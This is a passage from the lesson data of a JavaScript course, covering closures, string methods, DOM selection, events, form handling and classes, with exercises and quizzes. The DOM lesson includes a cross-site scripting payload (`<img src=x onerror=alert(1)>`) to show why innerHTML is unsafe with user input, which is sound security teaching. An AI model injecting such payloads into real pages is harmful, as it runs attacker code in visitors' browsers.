    ['p', "A closure is what happens when an inner function keeps using variables from the function that created it — even after that outer function has finished. It sounds abstract and it is behind almost everything."],
    ['h', "Scope, briefly"],
    ['code', 'js', `const outerName = "global";

function outer() {
  const middle = "function scope";
  if (true) {
    const inner = "block scope";
    console.log(outerName, middle, inner);   // all three visible
  }
  // inner is gone here
}`],
    ['p', "Lookup goes outward: the current block, then the enclosing function, then upward to the top. The first match wins, so an inner `const name` **shadows** an outer one."],
    ['h', "The closure"],
    ['lab', 'js', `function makeCounter() {
  let count = 0;                 // lives on, because next uses it
  return function next() {
    count += 1;
    return count;
  };
}

const a = makeCounter();
const b = makeCounter();
console.log(a(), a(), a());      // 1 2 3
console.log(b());                // 1 — its own private count`],
    ['p', "`makeCounter` returned long ago, yet `count` still exists — it stays alive because `next` still refers to it. Each call to `makeCounter` creates a fresh one, which is why `b` starts again at 1."],
    ['note', "That is private state without a class. The only way to touch `count` is through the function that was returned."],
    ['h', "The classic var bug"],
    ['lab', 'js', `for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log("var:", i), 10);
}

for (let j = 0; j < 3; j++) {
  setTimeout(() => console.log("let:", j), 20);
}`],
    ['p', "`var` gives one binding for the whole loop, so all three callbacks see its final value — `3, 3, 3`. `let` creates a fresh binding per iteration, so each closure captures its own — `0, 1, 2`. This single behaviour is the best argument for `let` there is."],
    ['h', "Where you already rely on it"],
    ['code', 'js', `function setupButton(label) {
  const clicks = 0;
  button.addEventListener("click", () => {
    console.log(label);        // label is still here, long after setup ran
  });
}`],
    ['p', "Every event handler, every `setTimeout` callback and every `.map(fn)` closes over the scope it was written in. You have been using closures since lesson one."]
  ],
  ex: [
    { q: "Run the counter lab. Why does `b()` return 1 when `a()` has already reached 3?",
      a: "Each call to `makeCounter` creates a new scope with its own `count`. The two returned functions close over different variables that happen to share a name." },
    { q: "Write `makeCounter()` from scratch and explain why `count` is not garbage-collected.",
      a: "The returned function still references it, so the scope stays alive as long as that function does. Memory is freed only when nothing can reach it any more." },
    { q: "Run the var/let lab. Explain both outputs precisely.",
      hint: "How many bindings does each loop create?",
      a: "`var` creates one binding shared by all three callbacks; by the time they run the loop has finished and `i` is 3, so they print 3, 3, 3. `let` creates a new binding each iteration, and each arrow closes over its own — 0, 1, 2." },
    { q: "Write `once(fn)` returning a function that runs `fn` only the first time and then returns the same result forever.",
      hint: "Keep two variables in the closure.",
      a: "`called` and `result` are private — nothing outside can reset them.",
      code: ['js', `function once(fn) {
  let called = false, result;
  return (...args) => {
    if (!called) { called = true; result = fn(...args); }
    return result;
  };
}`] },
    { q: "Name two things you already use that depend on closures.",
      a: "Event handlers, which keep using variables from the function that registered them; `setTimeout` callbacks; and every callback passed to `map`, `filter` or `reduce` that references a variable from the surrounding scope." }
  ],
  quiz: [
    { q: "What is a closure?",
      opts: ["A closed-over object", "A function that keeps access to the scope it was created in", "A private class", "A finished loop"], correct: 1,
      why: "The outer variables stay alive for as long as the inner function can reach them." },
    { q: "`for (var i...)` with three setTimeouts prints…",
      opts: ["0 1 2", "3 3 3", "undefined ×3", "nothing"], correct: 1,
      why: "One shared binding, read after the loop finished. `let` gives a fresh binding per iteration and prints 0 1 2." },
    { q: "Two counters from the same factory share their count?",
      opts: ["Yes", "No — each call creates a new scope", "Only with var", "Only in strict mode"], correct: 1,
      why: "Each invocation makes fresh variables, which is what makes the pattern useful." },
    { q: "Why is a closure variable not garbage-collected?",
      opts: ["JavaScript never collects", "Something still references it", "It is global", "It is frozen"], correct: 1,
      why: "Memory is freed only when nothing can reach the value any more." }
  ],
  fill: [
    { prompt: "Keep private state across calls.", lang: 'js',
      code: 'function makeCounter() {\n  ___ count = 0;\n  return () => ++count;\n}', opts: ["const", "let", "var", "static"], correct: 1,
      why: "It is reassigned on every call, so const would throw." },
    { prompt: "Give each loop iteration its own binding.", lang: 'js',
      code: 'for (___ i = 0; i < 3; i++) setTimeout(() => console.log(i));', opts: ["var", "let", "const", "int"], correct: 1,
      why: "var shares one binding, so every callback sees the final value." },
    { prompt: "Return the inner function so the scope survives.", lang: 'js',
      code: 'function outer() {\n  let n = 0;\n  ___ () => ++n;\n}', opts: ["call", "return", "yield", "export"], correct: 1,
      why: "Handing the inner function out is what keeps the outer scope alive." }
  ]
};

LESSON_CONTENT_2["js:10"] = {
  blocks: [
    ['p', "Backticks are the default quote in modern JavaScript, and the string methods below cover almost everything you will do to text."],
    ['h', "Template literals"],
    ['code', 'js', `const name = "Itay", count = 3;

\`shalom \${name}, you have \${count} tasks\`
\`next year: \${count + 1}\`                 // any expression
\`line one
line two\`                                  // real newlines, no \\n needed`],
    ['p', "Python's f-string with backticks instead of a prefix. Unlike `'` and `\"`, a template literal may span lines — which makes generating HTML far more readable."],
    ['code', 'js', `const item = t => \`
  <li class="\${t.done ? 'done' : ''}">
    \${t.title}
  </li>\`;`],
    ['h', "The methods worth memorising"],
    ['tbl',
      ["Method", "Does", "Example"],
      [
        ["`trim()`", "removes surrounding whitespace", "`\"  a \".trim()` → `\"a\"`"],
        ["`split(sep)`", "string → array", "`\"a,b\".split(\",\")` → `[\"a\",\"b\"]`"],
        ["`join(sep)`", "array → string", "`[\"a\",\"b\"].join(\", \")`"],
        ["`includes(x)`", "boolean", "`\"flask\".includes(\"las\")`"],
        ["`startsWith` / `endsWith`", "boolean", "`path.endsWith(\".py\")`"],
        ["`replace(a, b)`", "first match only", "`\"a-a\".replace(\"-\", \"+\")`"],
        ["`replaceAll(a, b)`", "every match", "`\"a-a\".replaceAll(\"-\", \"+\")`"],
        ["`slice(a, b)`", "substring, negatives allowed", "`\"hello\".slice(-3)` → `\"llo\"`"],
        ["`padStart(n, ch)`", "pads to a length", "`\"7\".padStart(2, \"0\")` → `\"07\"`"],
        ["`toUpperCase()`", "case", ""]
      ]
    ],
    ['warn', "Strings are **immutable**. Every method returns a new string; none change the original. `text.trim()` on its own does nothing — you must use the result."],
    ['lab', 'js', `const raw = "  Learn Flask, Learn CSS  ";

console.log(JSON.stringify(raw.trim()));
console.log(raw.trim().split(", "));
console.log(raw.replace("Learn", "Master"));       // first only
console.log(raw.replaceAll("Learn", "Master"));    // both
console.log("7".padStart(2, "0"), "12".padStart(2, "0"));`],
    ['h', "A first look at regular expressions"],
    ['code', 'js', `/\\d+/.test("abc123");                  // true — contains digits
"a1b2".replace(/\\d/g, "#");            // "a#b#"  g = every match
"2026-08-01".match(/(\\d{4})-(\\d{2})/); // captured groups`],
    ['p', "`replace` with a string swaps the first occurrence; with a `/g` regex it swaps all — which is what `replaceAll` was added to make obvious."]
  ],
  ex: [
    { q: "Build a greeting with a template literal that also shows `count + 1`.",
      a: "Any expression works inside `${}`, not just a variable name.",
      code: ['js', `\`shalom \${name}, next year \${count + 1}\``] },
    { q: "Why does `text.trim()` alone leave `text` unchanged?",
      a: "Strings are immutable, so every method returns a new string and leaves the original alone. You must assign the result: `text = text.trim()`." },
    { q: "Turn `\"  a, b , c \"` into `[\"a\", \"b\", \"c\"]` with no stray spaces.",
      hint: "Split, then clean each piece.",
      a: "Splitting on `\", \"` alone fails on `\"b , c\"`. Split on the comma and trim each part.",
      code: ['js', `"  a, b , c ".split(",").map(s => s.trim());`] },
    { q: "Format a number as two digits — `7` → `\"07\"`. What must you do first?",
      a: "`padStart` is a string method, so convert first: `String(7).padStart(2, \"0\")`. Calling it on a number throws.",
      code: ['js', `String(n).padStart(2, "0");`] },
    { q: "`\"a-b-c\".replace(\"-\", \"+\")` gives `\"a+b-c\"`. Give two ways to replace all of them.",
      a: "`replaceAll(\"-\", \"+\")`, or a global regex `replace(/-/g, \"+\")`. A plain string argument only ever matches once." }
  ],
  quiz: [
    { q: "What can a template literal do that a quoted string cannot?",
      opts: ["Hold numbers", "Span multiple lines and interpolate expressions", "Be compared", "Be immutable"], correct: 1,
      why: "Backticks plus ${} — Python's f-string with different punctuation." },
    { q: "What does `text.trim()` do to `text`?",
      opts: ["Trims it", "Nothing — strings are immutable, it returns a new one", "Raises", "Empties it"], correct: 1,
      why: "Every string method returns a new string. You must use the return value." },
    { q: "`\"a-b-c\".replace(\"-\", \"+\")` gives…",
      opts: ["a+b+c", "a+b-c", "abc", "an error"], correct: 1,
      why: "A string argument replaces the first match only. Use replaceAll or a /g regex." },
    { q: "`\"hello\".slice(-3)` gives…",
      opts: ["\"hel\"", "\"llo\"", "\"lo\"", "an error"], correct: 1,
      why: "Negative indices count from the end." }
  ],
  fill: [
    { prompt: "Interpolate a value.", lang: 'js',
      code: 'const msg = `shalom ___{name}`;', opts: ["#", "$", "%", "@"], correct: 1,
      why: "${ } inside backticks; other quote styles do not interpolate." },
    { prompt: "Replace every occurrence.", lang: 'js',
      code: 'text.___("-", "+")', opts: ["replace", "replaceAll", "swap", "sub"], correct: 1,
      why: "replace with a string argument only changes the first match." },
    { prompt: "Pad a number to two digits.", lang: 'js',
      code: 'String(n).___(2, "0")', opts: ["pad", "padStart", "padLeft", "fill"], correct: 1,
      why: "padStart adds to the front until the length is reached." }
  ]
};

LESSON_CONTENT_2["js:11"] = {
  blocks: [
    ['p', "The DOM is the browser's live object model of your page. Flask sent HTML text; the browser parsed it into a tree, and JavaScript can read and change that tree."],
    ['h', "Finding elements"],
    ['code', 'js', `document.querySelector(".card");        // first match, or null
document.querySelectorAll("li");        // all matches, a NodeList
document.getElementById("name");        // one element, or null`],
    ['p', "`querySelector` takes **any CSS selector** — everything from the CSS track works here:"],
    ['code', 'js', `document.querySelector("#main .card > h2");
document.querySelector('input[name="title"]');
document.querySelectorAll("li:not(.done)");`],
    ['h', "A NodeList is not an array"],
    ['code', 'js', `const items = document.querySelectorAll("li");

items.length;                    // works
items.forEach(el => ...);        // works
items.map(el => ...);            // TypeError — no map

[...items].map(el => el.textContent);       // spread to a real array
Array.from(items, el => el.textContent);    // or this`],
    ['h', "Null is the usual bug"],
    ['code', 'js', `const el = document.querySelector(".typo");
el.textContent = "hi";
// TypeError: Cannot set properties of null (setting 'textContent')`],
    ['warn', "“Cannot read/set properties of null” almost always means one of two things: the selector does not match, or your script ran before the element existed. Check the selector in devtools first — paste `document.querySelector(\"...\")` into the console."],
    ['h', "Running too early"],
    ['code', 'html', `<head>
  <script src="/static/js/app.js"><\/script>          <!-\- runs too early -\->
  <script src="/static/js/app.js" defer><\/script>    <!-\- waits for parsing -\->
</head>`],
    ['p', "`defer` is the fix from lesson 01. If you cannot use it, wrap your code:"],
    ['code', 'js', `document.addEventListener("DOMContentLoaded", () => {
  // every element exists by now
});`],
    ['h', "Moving around the tree"],
    ['code', 'js', `el.parentElement;
el.children;                  // element children only
el.nextElementSibling;
el.closest(".card");          // nearest ancestor matching — very useful
el.querySelector(".title");   // search inside this element only`],
    ['p', "`closest` walks **upward**. It is how a click on a button finds the card it belongs to, which the events lesson leans on heavily."]
  ],
  ex: [
    { q: "Select the first `.card` and log its text. Then select one that does not exist and describe the error.",
      a: "`querySelector` returns `null` for no match, so the next property access throws `TypeError: Cannot read properties of null`. It is not a bad selector syntax error — the selector was fine, it just matched nothing." },
    { q: "Why does `document.querySelectorAll(\"li\").map(...)` throw?",
      a: "A NodeList is array-*like* — it has `length` and `forEach`, but not `map`, `filter` or `reduce`. Convert with `[...list]` or `Array.from(list)`." },
    { q: "Write a selector for every `<li>` inside `.card` that does **not** have class `done`.",
      hint: "The CSS track already covered `:not`.",
      a: "Every CSS selector works in `querySelectorAll` — that is why the two tracks reinforce each other.",
      code: ['js', `document.querySelectorAll(".card li:not(.done)");`] },
    { q: "Your script in `<head>` gets `null` for every selector. Give two fixes.",
      a: "Add `defer` to the `<script>` tag, or move it just before `</body>`. A third option is wrapping the code in a `DOMContentLoaded` listener, which works wherever the tag is." },
    { q: "A click lands on a button inside a card. How do you get the card?",
      hint: "Walk upward.",
      a: "`closest` searches the element and its ancestors for the first match, which is far more robust than chaining `parentElement` and breaks less when the markup changes.",
      code: ['js', `const card = event.target.closest(".card");`] }
  ],
  quiz: [
    { q: "What does `querySelector` return when nothing matches?",
      opts: ["An empty list", "undefined", "null", "It throws"], correct: 2,
      why: "Which is why the next property access throws 'Cannot read properties of null'." },
    { q: "Why does `.map()` fail on a NodeList?",
      opts: ["NodeLists are frozen", "It is array-like but not an array", "map needs an argument", "It is asynchronous"], correct: 1,
      why: "Convert with [...list] or Array.from(list)." },
    { q: "Your selectors all return null from a script in `<head>`. Why?",
      opts: ["Wrong selectors", "The script ran before the elements were parsed", "CSS is missing", "Flask blocked it"], correct: 1,
      why: "Add defer, move the tag before </body>, or listen for DOMContentLoaded." },
    { q: "What does `el.closest(\".card\")` do?",
      opts: ["Finds the nearest child", "Walks up to the nearest matching ancestor", "Finds the next sibling", "Measures distance"], correct: 1,
      why: "It is how a handler on a button finds the container it belongs to." }
  ],
  fill: [
    { prompt: "Get the first matching element.", lang: 'js',
      code: 'const card = document.___(".card");', opts: ["getElement", "querySelector", "find", "select"], correct: 1,
      why: "It takes any CSS selector and returns the first match or null." },
    { prompt: "Turn a NodeList into a real array.", lang: 'js',
      code: 'const titles = [___items].map(el => el.textContent);', opts: ["*", "...", "&", "new "], correct: 1,
      why: "Spread, or Array.from(items)." },
    { prompt: "Find the card a clicked button lives in.", lang: 'js',
      code: 'const card = event.target.___(".card");', opts: ["parent", "closest", "querySelector", "find"], correct: 1,
      why: "closest walks upward through the ancestors." }
  ]
};

LESSON_CONTENT_2["js:12"] = {
  blocks: [
    ['p', "Once you have an element you can change its text, its attributes, its classes and its children — and the page updates instantly, with no request to Flask."],
    ['h', "Text and HTML"],
    ['code', 'js', `el.textContent = "shalom";              // safe: sets text
el.innerHTML = "<b>shalom</b>";         // parses as markup`],
    ['warn', "`innerHTML` with anything a user typed is the browser-side version of `{{ value|safe }}` — it runs whatever they wrote. Use `textContent` unless you are inserting markup you built yourself."],
    ['code', 'js', `const comment = "<img src=x onerror=alert(1)>";
el.textContent = comment;    // shows the text, harmlessly
el.innerHTML = comment;      // runs it`],
    ['h', "Classes"],
    ['code', 'js', `el.classList.add("done");
el.classList.remove("done");
el.classList.toggle("done");            // returns true if now present
el.classList.toggle("done", isDone);    // force to a specific state
el.classList.contains("done");`],
    ['p', "**Toggle a class, do not set styles directly.** Keep the appearance in CSS and let JavaScript decide only which state applies — that is the whole reason `classList` exists."],
    ['h', "Attributes and data"],
    ['code', 'js', `el.setAttribute("aria-expanded", "true");
el.getAttribute("href");
el.removeAttribute("disabled");

el.dataset.taskId;                      // reads data-task-id
el.dataset.taskId = "42";               // writes it`],
    ['note', "`data-*` attributes are the sanctioned way to attach your own data to an element. `data-task-id` becomes `dataset.taskId` — hyphens become camelCase."],
    ['h', "Building elements"],
    ['lab', 'js', `const items = ["gaming", "coding", "reading"];

const list = document.createElement("ul");
for (const name of items) {
  const li = document.createElement("li");
  li.textContent = name;
  li.classList.add("hobby");
  list.append(li);
}
console.log(list.outerHTML);`],
    ['h', "Batching"],
    ['code', 'js', `// slow: the page is recalculated on every pass
for (const item of items) list.append(makeItem(item));

// fast: build off-screen, attach once
const frag = document.createDocumentFragment();
for (const item of items) frag.append(makeItem(item));
list.append(frag);`],
    ['p', "Each insertion can force the browser to recompute layout. A fragment lives outside the document, so one insertion does the work of many."]
  ],
  ex: [
    { q: "Set an element's text with `textContent`, then with `innerHTML`, passing `\"<b>hi</b>\"`. Compare.",
      a: "`textContent` shows the literal characters; `innerHTML` renders bold. That difference is exactly the Jinja autoescaping lesson, on the other side of the wire." },
    { q: "Why is `el.innerHTML = userComment` dangerous?",
      a: "It parses the string as markup, so `<img src=x onerror=...>` runs code in the visitor's browser. Same class of bug as `|safe` on user input in Jinja — use `textContent`." },
    { q: "Toggle a `done` class on click, and explain why that beats setting `style.textDecoration`.",
      a: "The appearance stays in CSS where it belongs, so a designer can change it without touching JavaScript, and the same class can drive several properties at once.",
      code: ['js', `button.addEventListener("click", () => item.classList.toggle("done"));`] },
    { q: "Store a task id on an element and read it back.",
      hint: "`data-*`.",
      a: "`data-task-id` in HTML becomes `dataset.taskId` in JavaScript — the hyphens become camelCase.",
      code: ['js', `li.dataset.taskId = "42";
console.log(li.dataset.taskId);`] },
    { q: "Build a `<ul>` of 500 items. Why use a DocumentFragment?",
      a: "Appending directly to a live element can force a layout recalculation each time. A fragment is not in the document, so you build the whole list off-screen and pay that cost once." }
  ],
  quiz: [
    { q: "Which is safe for text a visitor typed?",
      opts: ["innerHTML", "textContent", "outerHTML", "insertAdjacentHTML"], correct: 1,
      why: "textContent inserts characters; innerHTML parses markup and can run code." },
    { q: "What does `el.classList.toggle(\"done\", false)` do?",
      opts: ["Toggles it", "Always removes it", "Always adds it", "Throws"], correct: 1,
      why: "The second argument forces the state, which is handy when it comes from a boolean." },
    { q: "`data-task-id` is read in JavaScript as…",
      opts: ["dataset['data-task-id']", "dataset.taskId", "getAttribute('taskId')", "el.taskId"], correct: 1,
      why: "Hyphenated names become camelCase on the dataset object." },
    { q: "Why build a list in a DocumentFragment?",
      opts: ["It is required", "One insertion instead of many, avoiding repeated layout work", "It escapes HTML", "It sorts items"], correct: 1,
      why: "The fragment is outside the document, so no layout happens until you attach it." }
  ],
  fill: [
    { prompt: "Insert user text safely.", lang: 'js',
      code: 'el.___ = comment;', opts: ["innerHTML", "textContent", "outerHTML", "value"], correct: 1,
      why: "innerHTML would parse and run whatever they typed." },
    { prompt: "Flip a state class.", lang: 'js',
      code: 'el.___.toggle("done");', opts: ["class", "classList", "classes", "style"], correct: 1,
      why: "classList has add, remove, toggle and contains." },
    { prompt: "Attach your own data to an element.", lang: 'js',
      code: 'li.___.taskId = "42";', opts: ["data", "dataset", "attributes", "props"], correct: 1,
      why: "dataset maps to data-* attributes." }
  ]
};

LESSON_CONTENT_2["js:13"] = {
  blocks: [
    ['p', "Events are how a page becomes interactive: the browser tells your code that something happened, and hands you an object describing it."],
    ['code', 'js', `button.addEventListener("click", (event) => {
  console.log("clicked", event.target);
});`],
    ['tbl',
      ["Event", "Fires when"],
      [
        ["`click`", "pressed and released"],
        ["`input`", "a field's value changes, on every keystroke"],
        ["`change`", "a field is committed (blur, or a select changes)"],
        ["`submit`", "a form is submitted — on the **form**, not the button"],
        ["`keydown`", "a key goes down; `event.key` is the character"],
        ["`DOMContentLoaded`", "the HTML is parsed"]
      ]
    ],
    ['h', "The event object"],
    ['code', 'js', `event.target;            // what was actually clicked
event.currentTarget;     // what the listener is attached to
event.key;               // "Enter", "a", "Escape"
event.preventDefault();  // stop the browser's default behaviour
event.stopPropagation(); // stop it travelling further up`],
    ['warn', "`target` and `currentTarget` differ when the click lands on a child. Click the `<span>` inside a `<button>` and `target` is the span while `currentTarget` is the button — a classic source of “why is my handler getting the wrong element?”"],
    ['h', "Bubbling"],
    ['p', "An event fires on the deepest element, then travels up through every ancestor. That sounds like a nuisance and is actually the most useful thing here."],
    ['h', "Delegation"],
    ['code', 'js', `// one listener for a list that changes over time
list.addEventListener("click", (event) => {
  const button = event.target.closest("[data-delete]");
  if (!button) return;                         // clicked something else
  button.closest("li").remove();
});`],
    ['p', "Attach one listener to the container instead of one per item. It keeps working for items added later, and it is what this course's own page does for every button."],
    ['h', "preventDefault"],
    ['code', 'js', `form.addEventListener("submit", (event) => {
  event.preventDefault();          // stop the full-page reload
  const data = new FormData(form);
  console.log(Object.fromEntries(data));
});`],
    ['p', "Without it the browser posts the form and reloads the page, discarding everything your JavaScript was doing. This is the hinge between the Flask track and this one — same form, handled in the browser instead."],
    ['h', "Removing listeners"],
    ['code', 'js', `function onClick() {}
el.addEventListener("click", onClick);
el.removeEventListener("click", onClick);      // same reference required

el.addEventListener("click", () => {}, { once: true });   // auto-removes`],
    ['note', "You cannot remove an anonymous arrow — `removeEventListener` matches by identity, and a second `() => {}` is a different function."]
  ],
  ex: [
    { q: "Log a message on button click, showing both `event.target` and `event.currentTarget`. Put a `<span>` inside the button and click that.",
      a: "`target` is the span, `currentTarget` is the button the listener is on. Reach for `currentTarget` when you want the element you registered against." },
    { q: "Handle clicks for a list whose items are added later, using one listener.",
      hint: "Delegation plus `closest`.",
      a: "The listener lives on the container, so items added afterwards are covered automatically — no re-registration needed.",
      code: ['js', `list.addEventListener("click", (e) => {
  const btn = e.target.closest("[data-delete]");
  if (!btn) return;
  btn.closest("li").remove();
});`] },
    { q: "Intercept a form submit and log the fields instead of reloading.",
      hint: "The `submit` event belongs to the form.",
      a: "`FormData` reads every named field, and `Object.fromEntries` turns it into a plain object.",
      code: ['js', `form.addEventListener("submit", (e) => {
  e.preventDefault();
  console.log(Object.fromEntries(new FormData(form)));
});`] },
    { q: "Why can't you remove a listener registered as an anonymous arrow?",
      a: "`removeEventListener` matches by function identity, and a freshly written `() => {}` is a different object from the one you added. Keep a named reference, or use `{ once: true }`." },
    { q: "Listen for Enter in a text field without submitting the form.",
      hint: "`event.key`.",
      a: "Note `preventDefault` inside the branch only — otherwise you would block every other key too.",
      code: ['js', `input.addEventListener("keydown", (e) => {
  if (e.key !== "Enter") return;
  e.preventDefault();
  console.log("submit:", input.value);
});`] }
  ],
  quiz: [
    { q: "A click lands on a `<span>` inside a `<button>` with the listener. What is `event.target`?",
      opts: ["The button", "The span", "The document", "null"], correct: 1,
      why: "target is what was actually hit; currentTarget is what the listener is attached to." },
    { q: "What is event delegation?",
      opts: ["Copying handlers to each item", "One listener on a container, identifying the item with closest()", "Delaying handlers", "Removing handlers"], correct: 1,
      why: "It keeps working for items added later, and needs one listener instead of hundreds." },
    { q: "What does `preventDefault()` stop on a form submit?",
      opts: ["Bubbling", "The browser's own submit and page reload", "The handler", "Validation"], correct: 1,
      why: "stopPropagation is the one that stops bubbling — they are different things." },
    { q: "Why can an anonymous arrow not be removed?",
      opts: ["Arrows cannot be listeners", "removeEventListener matches by identity", "It needs `once`", "It can be"], correct: 1,
      why: "Keep a named reference, or register with { once: true }." }
  ],
  fill: [
    { prompt: "React to a click.", lang: 'js',
      code: 'button.___("click", onClick);', opts: ["on", "addEventListener", "listen", "bind"], correct: 1,
      why: "Type name, then the handler, then optional options." },
    { prompt: "Stop the form reloading the page.", lang: 'js',
      code: 'event.___();', opts: ["stopPropagation", "preventDefault", "cancel", "halt"], correct: 1,
      why: "stopPropagation stops bubbling; preventDefault stops the browser's own behaviour." },
    { prompt: "Find which item was clicked, using delegation.", lang: 'js',
      code: 'const li = event.target.___("li");', opts: ["parent", "closest", "find", "query"], correct: 1,
      why: "closest walks up from whatever was actually hit." }
  ]
};

LESSON_CONTENT_2["js:14"] = {
  blocks: [
    ['p', "Reading what someone typed, checking it as they type, and deciding what to send. This complements the Flask forms lesson — it never replaces it."],
    ['h', "Reading values"],
    ['code', 'js', `input.value;                 // always a string, even type="number"
Number(input.value);         // convert explicitly
checkbox.checked;            // boolean
select.value;                // the selected option's value
radio.form.querySelector('input[name="size"]:checked')?.value;`],
    ['h', "input versus change"],
    ['lab', 'js', `// Paste this into a real page's console to feel the difference:
// input  -> fires on every keystroke  (live validation, search-as-you-type)
// change -> fires when the field is committed (blur, or a select changes)
console.log("input : every keystroke");
console.log("change: on commit");`],
    ['h', "FormData reads the whole form"],
    ['code', 'js', `form.addEventListener("submit", (event) => {
  event.preventDefault();

  const data = new FormData(form);
  data.get("title");                       // one field
  Object.fromEntries(data);                // { title: "...", tag: "..." }
  data.getAll("tag");                      // repeated fields
});`],
    ['note', "`FormData` keys on the `name` attribute — the same attribute Flask's `request.form` uses. A field without `name` is invisible to both."],
    ['h', "Live validation"],
    ['code', 'js', `const input = form.querySelector("#title");
const error = form.querySelector(".error");

input.addEventListener("input", () => {
  const value = input.value.trim();
  const problem = value.length === 0 ? "Title is required."
                : value.length > 60   ? "Too long (60 max)."
                : "";
  error.textContent = problem;
  input.classList.toggle("invalid", problem !== "");
  form.querySelector("button").disabled = problem !== "";
});`],
    ['h', "The browser's own validation"],
    ['code', 'html', `<input name="title" required minlength="2" maxlength="60">
<input name="email" type="email">
<input name="age" type="number" min="0" max="120">`],
    ['code', 'js', `input.checkValidity();      // boolean
input.validationMessage;    // the browser's own text
input.setCustomValidity("That name is taken");   // "" clears it`],
    ['warn', "All of this is convenience for honest users. A request can be sent with curl, from a script, or with JavaScript disabled — none of which honour `required`. **Validate again in Flask.** Client-side for speed, server-side for truth."],
    ['h', "Sending it yourself"],
    ['code', 'js', `const response = await fetch("/api/tasks", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(Object.fromEntries(new FormData(form))),
});`],
    ['p', "That is the next-but-one lesson — the point here is that once you have intercepted the submit, where the data goes is entirely up to you."]
  ],
  ex: [
    { q: "Read a number input and add 1. Why is `input.value + 1` wrong?",
      a: "`value` is always a string, so `+` concatenates: `\"5\" + 1` is `\"51\"`. Convert with `Number(input.value)` — the same lesson as the type-coercion chapter, met in the wild." },
    { q: "Log a whole form as a plain object on submit.",
      hint: "`FormData` plus `Object.fromEntries`.",
      a: "Only fields with a `name` appear — exactly as with `request.form` in Flask.",
      code: ['js', `form.addEventListener("submit", (e) => {
  e.preventDefault();
  console.log(Object.fromEntries(new FormData(form)));
});`] },
    { q: "Show an error message as the user types, and disable the button while it is showing.",
      a: "Use the `input` event, not `change` — `change` only fires when the field is committed, which is far too late for live feedback." },
    { q: "The form has `required` on every field. Why must Flask still check?",
      a: "`required` is enforced by the browser only. curl, a script, or a browser with JavaScript disabled can all send whatever they like. The server is the only place that can actually enforce anything." },
    { q: "Handle a group of radio buttons, reading which is selected.",
      hint: "The `:checked` pseudo-class works in `querySelector`.",
      a: "`?.value` guards the case where none is selected yet, which would otherwise throw on `null`.",
      code: ['js', `const size = form.querySelector('input[name="size"]:checked')?.value ?? "medium";`] }
  ],
  quiz: [
    { q: "What type is `input.value` for `type=\"number\"`?",
      opts: ["number", "string", "null when empty", "NaN"], correct: 1,
      why: "Always a string. Convert with Number() before doing arithmetic." },
    { q: "Which event fires on every keystroke?",
      opts: ["change", "input", "submit", "blur"], correct: 1,
      why: "change waits until the field is committed — too late for live validation." },
    { q: "What does FormData key on?",
      opts: ["id", "the name attribute", "class", "placeholder"], correct: 1,
      why: "The same attribute Flask's request.form uses. No name, no data." },
    { q: "With `required` on every field, does Flask still need to validate?",
      opts: ["No", "Yes — anything can send a request without a browser", "Only for numbers", "Only in production"], correct: 1,
      why: "Client-side validation is for speed and feedback; the server is the only enforcement." }
  ],
  fill: [
    { prompt: "Turn a form into a plain object.", lang: 'js',
      code: 'Object.___(new FormData(form))', opts: ["assign", "fromEntries", "entries", "keys"], correct: 1,
      why: "FormData yields [name, value] pairs; fromEntries builds the object." },
    { prompt: "Validate as they type.", lang: 'js',
      code: 'input.addEventListener("___", check);', opts: ["change", "input", "keyup", "blur"], correct: 1,
      why: "input fires on every keystroke, including paste." },
    { prompt: "Do arithmetic on a field.", lang: 'js',
      code: 'const next = ___(input.value) + 1;', opts: ["parse", "Number", "int", "Value"], correct: 1,
      why: "value is a string, so + would concatenate." }
  ]
};

LESSON_CONTENT_2["js:15"] = {
  blocks: [
    ['p', "Classes package data with the functions that operate on it. The syntax looks like Python's; `this` does not behave like `self`."],
    ['code', 'js', `class Task {
  constructor(title) {
    this.title = title;
    this.done = false;
  }

  toggle() {
    this.done = !this.done;
    return this;
  }

  get label() {
    return this.done ? \`✓ \${this.title}\` : this.title;
  }

  static fromJSON(json) {
    return new Task(JSON.parse(json).title);
  }
}

const t = new Task("learn classes");
t.toggle().label;              // "✓ learn classes"`],
    ['tbl',
      ["JavaScript", "Python"],
      [
        ["`constructor(...)`", "`__init__(self, ...)`"],
        ["`this`", "`self` — but **implicit**, not a parameter"],
        ["`get label()`", "`@property`"],
        ["`static fromJSON()`", "`@classmethod`"],
        ["`#secret`", "a genuinely private field"],
        ["`new Task(...)`", "`Task(...)`"]
      ]
    ],
    ['h', "this is decided at the call site"],
    ['lab', 'js', `class Counter {
  constructor() { this.n = 0; }
  bumpMethod() { this.n++; return this.n; }
  bumpArrow = () => { this.n++; return this.n; }
}

const c = new Counter();
const loose = c.bumpMethod;
const bound = c.bumpArrow;

try { loose(); } catch (e) { console.log("detached method:", e.message); }
console.log("arrow field:", bound());`],
    ['warn', "A method pulled off its object loses `this`. `button.addEventListener(\"click\", obj.handle)` calls `handle` with `this` undefined — the single most common class bug. Fix it with an arrow field (`handle = () => {}`), or `obj.handle.bind(obj)`, or wrap it: `() => obj.handle()`."],
    ['h', "Inheritance"],
    ['code', 'js', `class TimedTask extends Task {
  constructor(title, minutes) {
    super(title);              // must come before any use of this
    this.minutes = minutes;
  }

  get label() {
    return \`\${super.label} (\${this.minutes}m)\`;
  }
}`],
    ['h', "Private fields"],
    ['code', 'js', `class Account {
  #balance = 0;                       // truly private

  deposit(amount) { this.#balance += amount; }
  get balance() { return this.#balance; }
}

new Account().#balance;               // SyntaxError — not reachable`],
    ['p', "Unlike Python's `_name` convention, `#` is enforced by the language."],
    ['h', "Prototypes underneath"],
    ['p', "`class` is syntax over prototypes: methods live on `Task.prototype`, and every instance delegates to it. You rarely touch that directly, but it explains why methods are shared rather than copied per instance."]
  ],
  ex: [
    { q: "Write a `Task` class with a constructor, a `toggle` method and a `label` getter.",
      a: "Returning `this` from `toggle` lets you chain: `t.toggle().label`." },
    { q: "Run the `this` lab. Why does the detached method throw while the arrow field works?",
      a: "A normal method's `this` is decided by how it is called; detached, there is no receiver, so `this` is `undefined` and `this.n++` throws. An arrow field captures `this` when the instance is built, so it stays bound however it is called." },
    { q: "Give three ways to pass a method as an event handler without losing `this`.",
      a: "An arrow class field, `obj.method.bind(obj)`, or a wrapper arrow `() => obj.method()`. All three fix the receiver; the arrow field is the tidiest for handlers." },
    { q: "Extend `Task` into `TimedTask`. What happens if you use `this` before `super()`?",
      a: "`ReferenceError: Must call super constructor before accessing 'this'`. The parent constructor is what creates the instance, so nothing exists to assign to until it has run.",
